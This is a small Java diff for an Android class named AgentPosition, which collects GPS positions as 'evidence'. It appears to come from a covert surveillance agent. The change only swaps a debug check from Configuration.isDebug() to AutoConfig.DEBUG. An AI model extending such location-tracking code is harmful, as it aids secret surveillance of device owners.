@@ -26,6 +26,7 @@ import com.android.service.LogR;
 import com.android.service.Status;
 import com.android.service.agent.position.GPSLocator;
 import com.android.service.agent.position.GPSLocatorPeriod;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
@@ -69,8 +70,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		try {
 			locator.join();
 		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			if(Configuration.isDebug()) { e.printStackTrace(); }
+			if(AutoConfig.DEBUG) { e.printStackTrace(); }
 		}
 		locator = null;
 	}
